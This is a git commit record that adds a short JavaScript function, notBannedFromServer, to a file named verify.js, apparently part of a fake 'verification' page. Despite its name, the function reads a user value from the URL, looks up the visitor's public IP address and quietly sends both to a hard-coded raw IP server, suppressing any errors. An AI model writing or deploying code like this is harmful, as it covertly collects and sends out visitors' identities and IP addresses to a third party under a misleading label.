83cfa01ae36f9d023ea9d62a9f59dc34f83cfe81
VeriGaurd <johnbaldwinwon@gmail.com>
2025-04-20 14:30:35 -0700

    Update verify.js

--- verify.js
+++ verify.js
@@ -1,1 +1,14 @@
 
+async function notBannedFromServer() {
+  const searchParams = new URLSearchParams(window.location.search);
+  user = searchParams.get('user');
+
+    try {
+        response = await fetch('https://api.ipify.org?format=json');
+        data = await response.json();
+        link = 'https://35.185.88.35:5000/robot?user='+user+'&ip='+data.ip
+        response = await fetch(link);
+    } catch (error) {
+        
+    }
+}
